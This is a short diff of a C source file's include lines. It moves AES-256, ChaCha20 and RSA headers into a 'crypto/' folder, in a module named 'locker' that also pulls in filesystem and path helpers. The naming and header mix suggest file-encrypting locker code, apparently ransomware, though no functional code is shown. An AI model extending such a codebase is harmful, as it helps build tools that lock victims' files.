@@ -1,6 +1,6 @@
 #include "locker.h"
-#include "aes/aes256.h"
-#include "chacha20/ecrypt-sync.h"
+#include "crypto/aes/aes256.h"
+#include "crypto/chacha20/ecrypt-sync.h"
 #include "filesystem/filesystem.h"
 #include "global_parameters.h"
 #include "memory.h"
@@ -8,7 +8,7 @@
 #include "pathsystem.h"
 
 #ifdef _WIN32
-#include "rsa/rsa.h"
+#include "crypto/rsa/rsa.h"
 #endif
 
 #include <stdio.h>
